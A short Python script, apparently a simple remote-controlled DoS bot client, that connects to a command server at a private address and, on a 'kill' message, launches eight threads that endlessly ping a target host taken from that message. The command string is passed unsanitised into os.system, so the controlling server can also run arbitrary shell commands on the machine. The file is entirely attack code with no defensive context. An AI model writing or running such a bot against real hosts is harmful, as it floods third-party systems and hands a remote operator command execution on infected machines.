import socket
import threading
import os

server_ip = "192.168.60.111"
server_port = 9999
list_thread_ping = []

def thread_recevoir(client_socket):
    while True:
        response = str(client.recv(1024))
        word = "kill"
        print(response)
        if response.find(word, 0) != -1:
                for x in range(8):
                    list_thread_ping.append(threading.Thread(target=thread_ping, args={response,}))
                    list_thread_ping[x].start()


def thread_ping(response):
    while True:
        hostname = response[7:len(response) -1]
        os.system("ping " + hostname)


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((server_ip,server_port))

thread_recevoir = threading.Thread(target=thread_recevoir, args={client,})
thread_recevoir.start()

while True:
    texte = input()
    client.send(str.encode(texte))
